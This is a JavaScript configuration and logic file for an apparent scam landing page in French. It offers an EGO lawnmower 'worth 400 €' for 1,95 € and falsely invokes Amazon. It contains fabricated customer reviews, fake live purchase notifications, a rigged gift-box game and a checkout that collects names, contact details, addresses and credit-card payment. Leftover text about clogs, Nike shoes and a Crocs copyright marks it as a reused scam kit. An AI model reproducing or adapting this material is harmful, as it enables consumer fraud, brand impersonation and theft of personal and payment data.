const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href;
const baseHref = window.location.protocol + '//' + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = (baseUrl ?? landingUrl).replace(/\/index\.html$/, '');

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "TAILLE : ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ]
  };

  const bottomRow = {
    bar: "menu",
    account: "Se connecter",
    heart: "Liste de souhaits",
    bag: "Panier",
    find: "Chercher"
  };

  const mainProduct = {
    header: "Offre limitée",
    name: "Tondeuse à gazon sans fil EGO 21in Autopropulsée",
    oldPrice: "400,00 €",
    newPrice: "1,95 €",
    selectText: "COULEUR : ",
    text: `Si vous cherchez un moyen de tondre votre pelouse avec moins de désordre, une empreinte carbone réduite et sans fumées à gérer, le kit de tondeuse à gazon autopropulsée sans fil de 21 pouces 56 volts Lithium-Ion avec batterie de 7,5 Ah et chargeur inclus est la solution idéale. Avec tout le couple d'un moteur à essence standard, cette tondeuse autopropulsée facilite le travail dans les conditions de tonte les plus difficiles.
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Barcelone, Espagne",
      action: "Je viens de recevoir mes sabots pour 1,95 euros !",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Carlos B******",
      location: "Madrid, Espagne",
      action: "Je viens de recevoir mes sabots pour 1,95 euros !",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Matthieu",
      time: "Il y a un jour",
      header: "C'est incroyable !",
      product: "26468781",
      review: "J'ai longtemps rêvé d'acheter une nouvelle tondeuse à gazon, car l'ancienne est tombée en panne. Merci Amazon pour la vente !",
      image: "./index_files/review1.jpg",
      rating: 100,
    },
    {
      name: "Lucas",
      time: "Il y a deux jours",
      header: "Génial ! Je n'ai pas de mots.",
      product: "26468783",
      review: "J'ai reçu ma tondeuse à gazon EGO, elle est encore plus belle que sur la photo !",
      image: "./index_files/review5.jpg",
      rating: 100,
    },
    {
      name: "Valentina",
      time: "Il y a deux jours",
      header: "Tout simplement génial.",
      product: "26468782",
      review: "Mon mari était contre ma participation, car nous n'avions rien entendu de cette vente, mais quand j'ai reçu le colis, il était très heureux.",
      image: "./index_files/review2.jpg",
      rating: 93,
    },
    {
      name: "Santiago",
      time: "Il y a quatre jours",
      header: "J'aime",
      product: "26468782",
      review: "Regardez simplement ma pelouse, elle est magnifique. Merci à EGO et Amazon pour ce cadeau.",
      image: "./index_files/review4.jpg",
      rating: 90,
    },
    {
      name: "Martina",
      time: "Il y a sept jours",
      header: "Wow, j'adore ce produit !",
      product: "26468783",
      review: "C'est la meilleure tondeuse à gazon que j'ai jamais achetée, très bonne qualité et d'après les avis, elle est durable. Merci pour cette vente.",
      image: "./index_files/review3.jpg",
      rating: 80,
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET COMMENTAIRES",
    percent: "99%",
    rec: "Commentaires sur cette promotion",
  };

  const questions = {
    _of: "Question {1} sur {2} : ",
    arr: [
      {
        q: "Avez-vous fait des achats sur Amazon ?",
        a: [
          "Oui, je l'ai acheté",
          "Non, jamais acheté",
        ],
      },
      {
        q: "Comment avez-vous entendu parler de l’offre ?",
        a: ["Sur le site officiel", "Publicité Facebook", "Des amis ont dit"],
      },
      {
        q: "Pourquoi acheter une tondeuse à gazon ?",
        a: ["Pour usage personnel", "Pour un cadeau"],
      },
    ],
  };

  const check = {
    title: "Votre réponse sera vérifiée...",
    arr: [
      "Vous avez répondu à la question 3/3.",
      "Votre adresse IP ne permet pas de tirer des conclusions sur les demandes précédentes.",
      "Votre réponse a été vérifiée.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Félicitations, vous avez confirmé que vous êtes une personne réelle",
        button: "OK",
        text: `
      <center>
      Aujourd'hui, {date}, vous avez l'opportunité d'acheter une paire de chaussures Nike Air Force 1'07 à un prix spécial
        <br><br>
        Tout ce que vous devez faire, c'est choisir la bonne boîte cadeau.
        <br><br>
        Vous avez 3 essais, bonne chance !
      </center>
      `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "OK",
        text: `
      <center>
      Malheureusement, ce cadeau est vide ! Il vous reste encore 2 essais - bonne chance !
      </center>
      `,
      },
    },
    win: {
      texts: {
        header: "Félicitations ! Vous avez gagné !",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
        Vous avez gagné une paire de chaussures "Nike Air Force 1'07"
        </p>
        <br>
        1) Cliquez sur "OK" pour aller à la page de livraison.
        <br><br>
        2) Remplissez le formulaire et payez la commande en utilisant votre remise personnelle.
        <br><br>
        3) Le colis sera livré en 2-3 jours.
      </center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "Adresse e-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Méthodes de paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Détails de la commande",
      oldPrice: "400,00 €",
      newPrice: "1,95 €",
      size: "Taille",
      subTotal: {
        title: "Sous-total",
        amount: "1,95 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "1,95 €",
      },
      checkoutButton: "Payer votre commande",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "Noir",
      miniImg: "./index_files/img/item1/item1.jpg",
      images: [
        "./index_files/img/item1/item1.jpg",
        "./index_files/img/item1/item2.jpg",
        "./index_files/img/item1/item3.jpg",
        "./index_files/img/item1/item4.jpg",
        "./index_files/img/item1/item5.jpg",
        // "./index_files/img/item1/item6.jpg",
        "./index_files/img/item1/item7.jpg",
        // "./index_files/img/item1/item8.jpg",
        // "./index_files/img/item1/item9.jpg",
      ],
    },
  ];

  const footer = {
    cr: "© Crocs™ | Copyright 2024 | Tous droits réservés",
  };


  const pathImgBox = {
    lid: "./index_files/box-lid.png",
    lidIOs: "./index_files/box-lid-ios.png",
    inner: "./index_files/box-inner.png",
    innerGift: "./index_files/box-inner-gift.png",
    box: "./index_files/box.png",
    boxModal: "./index_files/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    bottomRow
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);

const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value = `${mainProduct.name}: ${product.name}`;
  document.querySelector("input[name='product_image']").value = imageUrl;
  // console.log(localImageUrl);
  // console.log(imageUrl);

  return product;
};

const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;
  const selectedSize = sizes.arr?.[lsGetSelectedSizeInd()];
  document.querySelector("input[name='product_size']").value = selectedSize;

  return selectedSize;
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};

document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});
